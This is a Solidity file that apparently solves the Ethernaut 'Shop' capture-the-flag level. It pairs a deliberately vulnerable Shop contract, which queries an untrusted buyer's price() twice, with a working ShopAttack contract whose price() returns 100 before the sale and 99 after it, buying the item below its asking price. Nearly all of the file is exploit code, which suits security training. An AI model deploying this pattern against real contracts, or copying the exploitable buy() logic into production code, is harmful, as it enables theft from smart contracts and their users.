// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3300)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3300)();
    }
  }
}

contract ShopAttack {
    
    function price() external view returns (uint) {
        
        //Shop shop = Shop(0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B);
        //return shop.isSold() ? 0:100;     //if result of shop.isSold() will be "true" then return 0 and if will be "false" return 100
    
        bool isSold = Shop(msg.sender).isSold();
        
        assembly {
            let result
            
            switch isSold
            case 1 {
                result := 99
            }
            default {
                result := 100
            }
            
            mstore(0x0, result)
            return(0x0, 32)
        }
       
    }

  function attack(Shop _victim) public {
    Shop(_victim).buy();
  }
}